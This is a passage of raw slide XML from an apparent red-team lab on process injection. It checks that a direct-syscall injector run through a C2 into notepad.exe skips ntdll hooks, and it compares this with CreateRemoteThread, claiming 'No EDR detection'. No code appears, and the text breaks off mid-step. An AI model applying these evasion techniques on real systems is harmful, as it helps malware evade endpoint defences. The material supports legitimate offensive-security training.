            </a:pPr>
            <a:endParaRPr lang="en-US" sz="15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a:ln>
                  <a:noFill/>
                </a:ln>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5: Capture Process Monitor Trace (Direct Syscall)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Clear the Process Monitor trace.</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Run the SyscallInjector.exe through your C2.</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>In Process Monitor, observe the call stack:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>You will see:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>notepad.exe → </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>YourCode!SyscallStub</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> → syscall</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The call stack will NOT show any ntdll.dll functions.</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The syscall executes directly from your allocated stub memory.</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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chemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Take a screenshot showing the syscall executing without calling hooked </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ntdll</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> functions.</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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a:ln>
                  <a:noFill/>
                </a:ln>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6: Comparison (Side-by-Side)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500" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Aptos" panose="020B000402020202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500" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Aptos" panose="020B000402020202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500" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Aptos" panose="020B000402020202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500" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Aptos" panose="020B000402020202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500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg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500" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="15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indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="15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indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="14" name="Content Placeholder 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02569E29-C1EA-A3CF-5155-7AA826467BE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="614855952"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="137798" y="4766481"/>
          <a:ext cx="6105526" cy="1942465"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" firstCol="1" bandRow="1">
                <a:tableStyleId>{5C22544A-7EE6-4342-B048-85BDC9FD1C3A}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="3052763">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1246820812"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3052763">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="159523900"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Standard API (CreateRemoteThread)</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152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Direct Syscall</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152400" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="361325782"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Calls </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>ntdll!NtCreateThreadEx</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152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Calls YourStub → syscall</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152400" marR="0" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="659154077"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>EDR hook at </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>ntdll</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> entry point</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152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Bypasses hook entirely</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152400" marR="0" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3455055718"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Stack trace shows ntdll.dll</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0" marR="152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Stack trace shows your stub</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52400" marR="0" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="919880944"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Triggers EDR detection</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152400" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" marR="0">
                        <a:lnSpc>
                          <a:spcPct val="115000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="800"/>
                        </a:spcAft>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1200" kern="100" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>No EDR detection</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52400" marR="0" marT="95250" marB="95250" anchor="ctr"/>
                </a:tc>
                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2064973579"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25027068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E51953E-F1B3-48D2-8720-5F97A56AF96D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12192000" cy="4923912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Step 7: Verification via API Monitor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Alternative to Process Monitor – use API Monitor:</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:effectLst/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>Open API Monitor </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Menlo"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>2. Filter by Process: notepad.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>3. Filter by API: </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>NtCreateThreadEx</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>NtAllocateVirtualMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>NtWriteVirtualMemory</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>4. Run StandardInjector.exe – you will see calls to these APIs with EDR hooks. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>5. Run SyscallInjector.exe – you will see no API calls (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="1700" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
